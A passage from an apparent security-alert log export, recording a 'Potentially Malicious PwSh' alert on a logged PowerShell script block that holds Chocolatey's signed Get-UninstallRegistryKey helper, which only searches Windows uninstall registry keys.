BQtW/gOPSA0JIetcmJrqvRXdx3n0Sp32kBxn7XyypO1L3PxBgZwW94ekQDIe5v3F # SKlmv2E38T0tU5/IUX2PNV3vMKWHs3E7Me6r6+h1TcHeXhTrRrV586GCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NjU2WjAjBgkqhkiG9w0BCQQxFgQUQekAipyHZj/2ib13 # V41/KGW2HqcwDQYJKoZIhvcNAQEBBQAEggEAhdsnEFLCzzvdikeGGRpCELtJtKGY # dVO1NWtm4UqWDlCg6n+aWm0/81MWDOkyzeXzYuWeBK5dU2dvLrV3vtlKJvEDJ3p3 # caImQHht9OvP7kMWRJ9YuH5j+Hh2StWpsOxKWEQjUawkin2pJSOE7oFNte8rA0zB # fL9uclSP1n20elP+4Uf3NQASJdjcLypcwkOOk0D+mWjFI0eFTxc5WY6/u4u8hLZu # XS0q7rRIBi8wQgTtZQ63WQwkgl00kUpy1SdFehmRfbq2onSw8LbJQh6ZI/Gt477b # FWOp8lN75cQHTfqF31fPr/PDP0LPeVn0XKEsemZZEqhbWTQE/Pg4S+QHeA== # SIG # End signature block","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:21:49.160 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,85,"ScriptBlock: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2011 - 2017 RealDimensions Software, LLC # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Get-UninstallRegistryKey { <# .SYNOPSIS Retrieve registry key(s) for system-installed applications from an exact or wildcard search. .DESCRIPTION This function will attempt to retrieve a matching registry key for an already installed application, usually to be used with a chocolateyUninstall.ps1 automation script. The function also prevents `Get-ItemProperty` from failing when handling wrongly encoded registry keys. .NOTES Available in 0.9.10+. If you need to maintain compatibility with pre 0.9.10, please add the following to your nuspec (check for minimum version): ~~~xml <dependencies> <dependency id=""chocolatey-core.extension"" version=""1.1.0"" /> </dependencies> ~~~ .INPUTS String .OUTPUTS This function searches registry objects and returns an array of PSCustomObject with the matched key's properties. Retrieve properties with dot notation, for example: `$key.UninstallString` .PARAMETER SoftwareName Part or all of the Display Name as you see it in Programs and Features. It should be enough to be unique. The syntax follows the rules of the PowerShell `-like` operator, so the `*` character is interpreted as a wildcard, which matches any (zero or more) characters. If the display name contains a version number, such as ""Launchy (2.5)"", it is recommended you use a fuzzy search `""Launchy (*)""` (the wildcard `*`) so if Launchy auto-updates or is updated outside of Chocolatey, the uninstall script will not fail. Take care not to abuse fuzzy/glob pattern searches. Be conscious of programs that may have shared or common root words to prevent overmatching. For example, ""SketchUp*"" would match two keys with software names ""SketchUp 2016"" and ""SketchUp Viewer"" that are different programs released by the same company. .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .EXAMPLE > # Version match: Software name is ""Gpg4Win (2.3.0)"" [array]$key = Get-UninstallRegistryKey -SoftwareName ""Gpg4win (*)"" $key.UninstallString .EXAMPLE > # Fuzzy match: Software name is ""Launchy 2.5"" [array]$key = Get-UninstallRegistryKey -SoftwareName ""Launchy*"" $key.UninstallString .EXAMPLE > # Exact match: Software name in Programs and Features is ""VLC media player"" [array]$key = Get-UninstallRegistryKey -SoftwareName ""VLC media player"" $key.UninstallString .EXAMPLE > # Version match: Software name is ""SketchUp 2016"" # Note that the similar software name ""SketchUp Viewer"" would not be matched. [array]$key = Get-UninstallRegistryKey -SoftwareName ""SketchUp [0-9]*"" $key.UninstallString .LINK Install-ChocolateyPackage .LINK Install-ChocolateyInstallPackage .LINK Uninstall-ChocolateyPackage #> [CmdletBinding()] param( [parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true)] [string] $softwareName, [parameter(ValueFromRemainingArguments = $true)][Object[]] $ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters if ($softwareName -eq $null -or $softwareName -eq '') { throw ""$SoftwareName cannot be empty for Get-UninstallRegistryKey"" } $ErrorActionPreference = 'Stop' $local_key = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*' $machine_key = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*' $machine_key6432 = 'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' Write-Verbose ""Retrieving all uninstall registry keys"" [array]$keys = Get-ChildItem -Path @($machine_key6432, $machine_key, $local_key) -ErrorAction SilentlyContinue Write-Debug ""Registry uninstall keys on system: $($keys.Count)"" Write-Debug ""Error handling check: `'Get-ItemProperty`' fails if a registry key is encoded incorrectly."" [int]$maxAttempts = $keys.Count for ([int]$attempt = 1; $attempt -le $maxAttempts; $attempt++) { [bool]$success = $false $keyPaths = $keys | Select-Object -ExpandProperty PSPath try { [array]$foundKey = Get-ItemProperty -Path $keyPaths -ErrorAction Stop | ? { $_.DisplayName -like $softwareName } $success = $true } catch { Write-Debug ""Found bad key."" foreach ($key in $keys){ try { Get-ItemProperty $key.PsPath > $null } catch { $badKey = $key.PsPath } } Write-Verbose ""Skipping bad key: $badKey"" [array]$keys = $keys | ? { $badKey -NotContains $_.PsPath } } if ($success) { break; } if ($attempt -ge 10) { Write-Warning ""Found 10 or more bad registry keys. Run command again with `'--verbose --debug`' for more info."" Write-Debug ""Each key searched should correspond to an installed program. It is very unlikely to have more than a few programs with incorrectly encoded keys, if any at all. This may be indicative of one or more corrupted registry branches."" } } if ($foundKey -eq $null -or $foundkey.Count -eq 0) { Write-Warning ""No registry key found based on '$softwareName'"" } Write-Debug ""Found $($foundKey.Count) uninstall registry key(s) with SoftwareName:`'$SoftwareName`'""; return $foundKey } Set-Alias Get-InstallRegistryKey Get-UninstallRegistryKey # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCBES8sHzbRLLNcJ # 9iSdROLrD1zFWyfa5gBGwaNn1wzd16CCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgPavSbp9dQ2siazYDp0Amg+EIr+hM9dp7a+0W # HNXStdkwDQYJKoZIhvcNAQEBBQAEggEASoaLXJSP8+kK99AO2/eLEtUgHMzrBxAl # 3VzBEO3yPsYgKkF2KgZc4+FheBMEUJmGnqnZXUzigSJFj2yuCX9drT9SLDxYlqLs # 7Ua4a7P+6qNOI+fv4RgzDpKhDIfLSyNtjfin2TUO6nnmCmKXBHHCGl6wT+3jXZZN # OrP0DRckft9wI+yARwZnsliyJJMJVyJ1HWiWQ1NBv1E8kxeHyiEvOKFWMU5Fxjcj # shLQenOBAQ0zgPgtO+1Mv7tVKPC/mPwz0XreiGzGdSz4BVdzNX8eqWTKAgBPj3Mq # bPOn+9cJalY+K0OXF0qjKx27oDqAJTgXt+XxHQVVUY1bwypkep6pZaGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NjU2WjAjBgkqhkiG9w0BCQQxFgQUnLpFbpv40cF+T1dB # 0ypaJ3jlTSowDQYJKoZIhvcNAQEBBQAEggEALrngzN2q5JHS+d5l8DxExXPtlQNA # JAKNBwqX67SWFfNfkxNZMFGuFchaQdB0k9VI0jWjfw79y4ZstY4f30i0ejf2v1MI # wjk6Hb02leUalNfkLJ15/LVbIj5GVbqc/ozZca6//w2OEt1UOBIEtM3ouv+WOnXk # yFTtR9F7HK8MLWRSnQf1BGYxHqcV9oUGVQUkIj81FVXz/O0ZH6fZ21ZFl17OJ/Yo # T4MurhlQWXSGtEaBioiyMD+EUOlEF41qxzxorydfgg3Y+UHLtOayryak/AVggpi/ # F8NPHe/rwVBbXO28fjwtMdy/eyXD9cV+07qiarT2sJI6LZWqo7ag34qtVw== # SIG # End signature block","MessageNumber: 1 ¦ MessageTotal: 1 ¦ Path: C:\ProgramData\chocolatey\helpers\functions\Get-UninstallRegistryKey.ps1 ¦ ScriptBlockId: d8ab7ab5-5183-4adb-8c69-525c75ec5942 ¦ ScriptBlockText: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2011 - 2017 RealDimensions Software, LLC # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Get-UninstallRegistryKey { <# .SYNOPSIS Retrieve registry key(s) for system-installed applications from an exact or wildcard search. .DESCRIPTION This function will attempt to retrieve a matching registry key for an already installed application, usually to be used with a chocolateyUninstall.ps1 automation script. The function also prevents `Get-ItemProperty` from failing when handling wrongly encoded registry keys. .NOTES Available in 0.9.10+. If you need to maintain compatibility with pre 0.9.10, please add the following to your nuspec (check for minimum version): ~~~xml <dependencies> <dependency id=""chocolatey-core.extension"" version=""1.1.0"" /> </dependencies> ~~~ .INPUTS String .OUTPUTS This function searches registry objects and returns an array of PSCustomObject with the matched key's properties. Retrieve properties with dot notation, for example: `$key.UninstallString` .PARAMETER SoftwareName Part or all of the Display Name as you see it in Programs and Features. It should be enough to be unique. The syntax follows the rules of the PowerShell `-like` operator, so the `*` character is interpreted as a wildcard, which matches any (zero or more) characters. If the display name contains a version number, such as ""Launchy (2.5)"", it is recommended you use a fuzzy search `""Launchy (*)""` (the wildcard `*`) so if Launchy auto-updates or is updated outside of Chocolatey, the uninstall script will not fail. Take care not to abuse fuzzy/glob pattern searches. Be conscious of programs that may have shared or common root words to prevent overmatching. For example, ""SketchUp*"" would match two keys with software names ""SketchUp 2016"" and ""SketchUp Viewer"" that are different programs released by the same company. .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .EXAMPLE > # Version match: Software name is ""Gpg4Win (2.3.0)"" [array]$key = Get-UninstallRegistryKey -SoftwareName ""Gpg4win (*)"" $key.UninstallString .EXAMPLE > # Fuzzy match: Software name is ""Launchy 2.5"" [array]$key = Get-UninstallRegistryKey -SoftwareName ""Launchy*"" $key.UninstallString .EXAMPLE > # Exact match: Software name in Programs and Features is ""VLC media player"" [array]$key = Get-UninstallRegistryKey -SoftwareName ""VLC media player"" $key.UninstallString .EXAMPLE > # Version match: Software name is ""SketchUp 2016"" # Note that the similar software name ""SketchUp Viewer"" would not be matched. [array]$key = Get-UninstallRegistryKey -SoftwareName ""SketchUp [0-9]*"" $key.UninstallString .LINK Install-ChocolateyPackage .LINK Install-ChocolateyInstallPackage .LINK Uninstall-ChocolateyPackage #> [CmdletBinding()] param( [parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true)] [string] $softwareName, [parameter(ValueFromRemainingArguments = $true)][Object[]] $ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters if ($softwareName -eq $null -or $softwareName -eq '') { throw ""$SoftwareName cannot be empty for Get-UninstallRegistryKey"" } $ErrorActionPreference = 'Stop' $local_key = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*' $machine_key = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*' $machine_key6432 = 'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' Write-Verbose ""Retrieving all uninstall registry keys"" [array]$keys = Get-ChildItem -Path @($machine_key6432, $machine_key, $local_key) -ErrorAction SilentlyContinue Write-Debug ""Registry uninstall keys on system: $($keys.Count)"" Write-Debug ""Error handling check: `'Get-ItemProperty`' fails if a registry key is encoded incorrectly."" [int]$maxAttempts = $keys.Count for ([int]$attempt = 1; $attempt -le $maxAttempts; $attempt++) { [bool]$success = $false $keyPaths = $keys | Select-Object -ExpandProperty PSPath try { [array]$foundKey = Get-ItemProperty -Path 